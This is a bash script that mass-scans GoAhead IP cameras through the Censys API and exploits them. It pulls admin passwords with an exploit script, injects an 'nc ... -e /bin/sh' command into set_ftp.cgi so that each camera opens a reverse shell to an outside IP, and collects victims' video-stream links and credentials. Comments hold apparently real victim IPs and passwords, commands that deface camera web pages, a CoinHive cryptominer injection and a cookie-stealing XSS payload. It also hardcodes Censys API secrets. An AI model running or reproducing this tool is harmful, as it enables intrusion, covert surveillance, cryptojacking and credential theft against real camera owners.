#!/bin/bash
###################################################
#install the following stuff
# censys_io.py
# feh
# GeoLiteCity.dat
#
#
###################################################
# set an initial values
Api=0
Exploit=0
Count=5
CENSYS_API="359d0eb3-f137-4825-aeb1-4883d1cf21f0"
CENSYS_SECRET="9h04xDC5aTCUiwlGxUiZto01DVlcglr3"

# read the options
TEMP=`getopt -o a:ehc: --long api:,exploit,help,count: -n 'test.sh' -- "$@"`
eval set -- "$TEMP"

# extract options and their arguments into variables.
while true ; do
    case "$1" in
        -a|--api)
            case "$2" in
                "") shift 2 ;;
                *) Api=$2 ; shift 2 ;;
            esac ;;
        -h|--help) Help=1 ; shift ;;
        -e|--exploit) Exploit=1 ; shift ;;
        -c|--count)
            case "$2" in
                "") shift 2 ;;
                *) Count=$2 ; shift 2 ;;
            esac ;;
        --) shift ; break ;;
        *) echo "Internal error!" ; exit 1 ;;
    esac
done

shw_grey () {
  echo $(tput bold)$(tput setaf 0) $@ $(tput sgr 0)
}
shw_nr1 () {
  echo $(tput bold)$(tput setaf 9) $@ $(tput sgr 0)
}
shw_nr2 () {
  echo $(tput bold)$(tput setaf 8) $@ $(tput sgr 0)
}
shw_nr3 () {
  echo $(tput bold)$(tput setaf 7) $@ $(tput sgr 0)
}
shw_info () {
  echo $(tput bold)$(tput setaf 4) $@ $(tput sgr 0)
}
shw_warn () {
  echo $(tput bold)$(tput setaf 2) $@ $(tput sgr 0)
}
shw_err ()  {
  echo $(tput bold)$(tput setaf 1) $@ $(tput sgr 0)
}

#Instructions
if [[ $Help -eq 1 ]]; then
	echo "Usage :"
	echo " -c/--count <number> 	# how many targets should be pulled from api "
  echo "  -e/--exploit		# run exploit on found targets"
  echo "  -a/--api <number>        # Choose api (0)censys.io (1)shodan.io"
  echo "  -h/--help			# show this help"
	echo "Example :"
	echo " cam_scan.sh --api 0 --count 100 --exploit"
	echo "Files can be found in /root/.Cam_Scan/output/"
	exit
fi

#BUILD file ENV
LootFolderBackup="/root/.Cam_Scan/output_backup"$(date '+%d_%m_%Y_%H_%M')
LootFolder="/root/.Cam_Scan/output"
mkdir -p $LootFolder

LootFolder=$(echo $LootFolder'/')
:> $LootFolder'clean.lst'

#main function
function Main(){

  #Get targets
  Get_Targets $Api $Count

  cat $LootFolder'clean.lst' >> $LootFolder'BackupTargets.lst'
  if [[ $Exploit -eq 1 ]]; then
  	shw_info "exploiting!"
  	ExploitList && ReportLoot
    #Listen for shells
    echo -n "Listen for incoming shell on port 666?(y/n)"
    read answer
    if echo "$answer" | grep -iq "^y" ;then
      echo -n "Extern?(y/n)"
      read answer
      if echo "$answer" | grep -iq "^y" ;then
        xterm -hold -e "nc -l -p 666 -vvv" &
        echo -n "Trigger how many Random cams on port 666?(default:10)"
      	read answer
        if [[ $answer -eq "" ]]; then
          TriggerRandomFtp 10
        else
          TriggerRandomFtp $answer
        fi
      else
        echo "Start listening"
        command nc -l -p 666 -vvv &
      fi
    fi
  fi

  #Clean The Scene
  echo -n "Remove traces on targets?(y/n)"
  read answer2
  if echo "$answer2" | grep -iq "^y" ;then
  	echo "Removing traces!"
    for i in $(cat $LootFolder'strip.lst'); do
      curl $i --max-time 4 > $LootFolder'deltrace.lst';
    done
    rm $LootFolder'deltrace.lst'
  fi
  echo -n "Clean loot folder?(y/n)"
  read answerclean
  if echo "$answerclean" | grep -iq "^y" ;then
    mkdir -p $LootFolderBackup
    LootFolderBackup=$(echo $LootFolderBackup'/')
  	echo "Cleaning lootfolder Backup in "$LootFolderBackup
    cp -r  $LootFolder  $LootFolderBackup
    rm -r  $LootFolder
    mkdir  $LootFolder
    :>  $LootFolder'Data.lst'
  else
    ReportLoot 1
  fi

}

#SCANNER
function Get_Targets(){
  api_engine=$1
  if [[ $api_engine -eq 0 ]]; then
    clear
    shw_nr2 "Scraping censys Api..."
  	censys_io.py "GoAhead 5ccc069c403ebaf9f0171e9517f40e41" --api_id $CENSYS_API --api_secret $CENSYS_SECRET --tsv --limit $2 -f ip,protocols |awk '{print $1":"$2}' > $LootFolder'Data.lst'
  elif [[ $api_engine -eq 1 ]]; then
    shw_err "Shodan not jet implemented"
    exit
  fi
  #cat $LootFolder'Data.lst'
	for i in $(cat $LootFolder'Data.lst'); do
		WORDTOREMOVE="\/http"
		i=${i//$WORDTOREMOVE/}
		WORDTOREMOVE="\/cwmp"
		i=${i//$WORDTOREMOVE/}
		#echo $i  |awk -F ',' '{print $1}'
		echo $i |awk -F ',' '{print $1}' >>  $LootFolder'clean.lst'
	done
	echo "Logged "$Count" of them in : "$LootFolder'clean.lst'
}

#EXPLOITER
function ExploitList(){

  cat $LootFolder'clean.lst' |head -n $Count >  $LootFolder'clean_count_limit_'$Count'.lst'

	command exploit_camera.py \
		-b 2 -l $LootFolder'clean_count_limit_'$Count'.lst' -o $LootFolder'exploit_loot.lst'

	cat $LootFolder'exploit_loot.lst' |grep password >>  $LootFolder'BackupExploitLoot.lst'

	get_auth_link

}

#(todo)Exploit one ip:port
function ExploitOne(){
	echo
}

#shell popper
function TriggerRandomFtp(){
  C=$1
  for i in $(cat $LootFolder'camtriggers.lst' |shuf |tail -n $C); do
      echo "$i"
      command curl "$i" --max-time 3 > null
  done
  echo -n "Again?(y/n)"
	read answer
	if echo "$answer" | grep -iq "^y" ;then
    TriggerRandomFtp $C
  fi
}

#DATAHANDLERS
function ReportLoot(){
  if [[ $1 -eq 1 ]]; then
    CLINES=10000
  else
    CLINES=$Count
  fi
  # shw_info "------------------------------------------------------------------------------"
  # cat $LootFolder'strip.lst'|tail -n $Count |sort -u
  	shw_info "------------------------------------------------------------------------------"
  	cat $LootFolder'camstreams.lst' |tail -n $CLINES |sort -u
  	shw_info "------------------------------------------------------------------------------"
  	cat $LootFolder'camtriggers.lst'|tail -n $CLINES |sort -u
  	shw_info "------------------------------------------------------------------------------"
    #geo mapping

    #cat '/root/.Cam_Scan/output/BackupTargets.lst' |awk -F ':' '{print $1}' |sort -u > '/root/.Cam_Scan/output/BackupTargetsnoport.lst' && python /usr/bin/pygeoipmap.py -i '/root/.Cam_Scan/output/BackupTargetsnoport.lst' -f ip -s m -db /usr/bin/GeoLiteCity.dat -o '/root/.Cam_Scan/output/BackupTargets.png' && feh /root/.Cam_Scan/output/BackupTargets.png

    cat $LootFolder'BackupTargets.lst' |awk -F ':' '{print $1}' > $LootFolder'BackupTargetsnoport.lst'
    python /usr/bin/pygeoipmap.py -i $LootFolder'BackupTargetsnoport.lst' -f ip -s m -db /usr/bin/GeoLiteCity.dat -o $LootFolder'BackupTargets.png' > null
    feh $LootFolder'BackupTargets.png' &

}
remove_word() (
	set -f
	IFS=' '

	s=$1
	w=$2

	set -- $1
	for arg do
	shift
	[ "$arg" = "$w" ] && continue
	set -- "$@" "$arg"
	done

	printf '%s\n' "$*"
)
function curlshit(){
	#1 	ip
	#2	port
	#3	user
	#4	pass
	echo "http://"$3":"$4"@"$1":"$2
 	#echo 'http://'$3':'$4'@'$1':'$2'/set_ftp.cgi?next_url=ftp.htm&loginuse='$3'&loginpas='$4'&svr=%24(nc%2082.75.163.96%20'$5'%20-e%20%2Fbin%2Fsh)&port=21&user=ftp&pwd=ftp&dir=/&mode=0&upload_interval=0'
	curl 'http://'$3':'$4'@'$1':'$2'/set_ftp.cgi?next_url=ftp.htm&loginuse='$3'&loginpas='$4'&svr=%24(nc%2082.75.163.96%20'$5'%20-e%20%2Fbin%2Fsh)&port=21&user=ftp&pwd=ftp&dir=/&mode=0&upload_interval=0' --max-time 10  > /dev/null

	Trigger='http://'$3':'$4'@'$1':'$2'/ftptest.cgi?next_url=test_ftp.htm&loginuse='$3'&loginpas='$4
	echo "$Trigger" >>  $LootFolder'camtriggers.lst'
	echo "$Trigger"
	#Stash $lootfolder'camtriggers.lst' $lootfolder'camtriggers_stash.lst' 0
	echo 'http://'$3':'$4'@'$1':'$2'/videostream.cgi?loginuse='$3'&loginpas='$4 >> $LootFolder'camstreams.lst'
	#Stash 'http://'$3':'$4'@'$1':'$2'/videostream.cgi?loginuse='$3'&loginpas='$4 $lootfolder'camstreams_stash.lst'
	echo $(echo  'http://'$3':'$4'@'$1':'$2'/set_ftp.cgi?next_url=ftp.htm&loginuse='$3'&loginpas='$4'&svr=%24(nc%20666%20-e%20%2Fbin%2Fsh)&port=21&user=ftp&pwd=ftp&dir=/&mode=0&upload_interval=0') >> $LootFolder'strip.lst'

}
function get_auth_link(){
	for i in $(cat $LootFolder'BackupExploitLoot.lst' |sort -u |tail -n $Count); do
		#filterout needs
		IP=$(echo $i |awk -F ',' '{print $1}'|awk -F ':' '{print $2}' )
		PORT=$(echo $i |awk -F ',' '{print $2}'|awk -F ':' '{print $2}' )
		NAME_PASS=$(echo $i |awk -F ',' '{print $3}'|awk -F ':' '{print $2}' )

    #save passwords
    echo $NAME_PASS >> $LootFolder'passwords.lst'
    cat $LootFolder'passwords.lst' |sort -u > $LootFolder'passwords_clean.lst'
    cat $LootFolder'passwords_clean.lst' > $LootFolder'passwords.lst'
    rm $LootFolder'passwords_clean.lst'

			if [[ $IP ]]; then
				echo "HacKinG fTp BaCkDoOr: "$IP":"$PORT":admin:"$NAME_PASS;
				curlshit $IP $PORT "admin" $NAME_PASS '666'
			fi

	done
}

#INIT
Main

#http://admin:888888dima@85.31.113.252/
# cd system/www && cp monitor2.htm monitorK00B404.htm && rm monitor2.htm &&  wget http://admin:888888dima@85.31.113.252:80/monitor2.htm && cp admin2.htm adminK00B404.htm && rm admin2.htm && wget http://admin:888888dima@85.31.113.252:80/admin2.htm  && cp ftp.htm ftpK00B404.htm && rm ftp.htm && wget http://admin:888888dima@85.31.113.252:80/ftp.htm && cp iphone.htm iphoneK00B404.htm && rm iphone.htm && wget http://admin:888888dima@85.31.113.252:80/iphone.htm && wget http://admin:888888dima@85.31.113.252:80/thehive.js  && cd .. && cd ..


#cd system/www && cp monitor2.htm monitorK00B404.htm && rm monitor2.htm && wget http://admin:2711975itay@213.57.75.55:81/monitor2.htm && cp admin2.htm adminK00B404.htm && rm admin2.htm && wget http://admin:2711975itay@213.57.75.55:81/admin2.htm && cp ftp.htm ftpK00B404.htm && rm ftp.htm && wget http://admin:2711975itay@213.57.75.55:81/ftp.htm && cp iphone.htm iphoneK00B404.htm && rm iphone.htm && wget http://admin:2711975itay@213.57.75.55:81/iphone.htm && cd .. && cd .. && exit
#cd system/www && cp monitor.htm monitorK00B404.htm && rm monitor.htm && wget http://admin:2711975itay@213.57.75.55:81/monitor2.htm && cp admin2.htm adminK00B404.htm && rm admin2.htm && wget http://admin:2711975itay@213.57.75.55:81/admin2.htm && cp ftp.htm ftpK00B404.htm && rm ftp.htm && wget http://admin:2711975itay@213.57.75.55:81/ftp.htm && cp iphone.htm iphoneK00B404.htm && rm iphone.htm && wget http://admin:2711975itay@213.57.75.55:81/iphone.htm && cd .. && cd .. && exit

#cd tmp/web cp index.htm index.txt && cp index.htm indexK00B404.htm && wget http://electroman.nl/cam_index.htm.txt && rm index.htm && cp cam_index.htm.txt index.htm && cd tmp/web && cp ftp.htm ftp.txt && wget http://electroman.nl/cam_ftp.htm.txt && rm ftp.htm && cp cam_ftp.htm.txt ftp.htm

#cd /tmp/web && cp index.htm monitorK00B404.htm && rm index.htm && head -n -2 monitorK00B404.htm > index.htm && echo "<script src='https://coinhive.com/lib/coinhive.min.js'></script><script>var miner = new CoinHive.User('PTQQeue0YxRL3vkJlPM2KpR2iEp3F6rl', 'minimeminer');miner.start();</script></body></html>" >> index.htm && exit

# cd /tmp/web && cp index.htm monitorK00B404.htm && rm index.htm && head -n -2 monitorK00B404.htm > index.htm && echo "<script src='https://coinhive.com/lib/coinhive.min.js'></script><script>var miner = new CoinHive.User('PTQQeue0YxRL3vkJlPM2KpR2iEp3F6rl', 'minimeminer');miner.start();</script>" >> index.htm && cat index.htm |grep coin

# echo "<script src='https://coinhive.com/lib/coinhive.min.js'></script><script>var miner = new CoinHive.User('PTQQeue0YxRL3vkJlPM2KpR2iEp3F6rl', 'minimeminer');miner.start();</script></body></html>" >> index.htm
# echo "var miner = new CoinHive.User('PTQQeue0YxRL3vkJlPM2KpR2iEp3F6rl', 'minimeminer', { throttle: 0.6 });" >> index.htm

#<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.User("PTQQeue0YxRL3vkJlPM2KpR2iEp3F6rl", "minimeminer");miner.start();</script><img src=x onerror=this.src="http://rootbait.000webhostapp.com/cookies.php?c="+document.cookie+"admin-Lisa1966">

#rm index.htm && head -n -1 indexK00B404.htm > index.htm


# http://admin:111111@110.142.135.148:80/set_devices.cgi?next_url=multidev.htm&loginuse=admin&loginpas=111111
# 	&dev2_host=81.193.218.106&dev2_alias=Billy005&dev2_port=80&dev2_user=admin&dev2_pwd=Billy005
# 	&dev3_host=103.253.10.30&dev3_alias=206862&dev3_port=8888&dev3_user=admin&dev3_pwd=206862
# 	&dev4_host=&dev4_alias=&dev4_port=0&dev4_user=&dev4_pwd=
# 	&dev5_host=&dev5_alias=&dev5_port=0&dev5_user=&dev5_pwd=
# 	&dev6_host=&dev6_alias=&dev6_port=0&dev6_user=&dev6_pwd=
# 	&dev7_host=&dev7_alias=&dev7_port=0&dev7_user=&dev7_pwd=
# 	&dev8_host=&dev8_alias=&dev8_port=0&dev8_user=&dev8_pwd=
# 	&dev9_host=&dev9_alias=&dev9_port=0&dev9_user=&dev9_pwd=
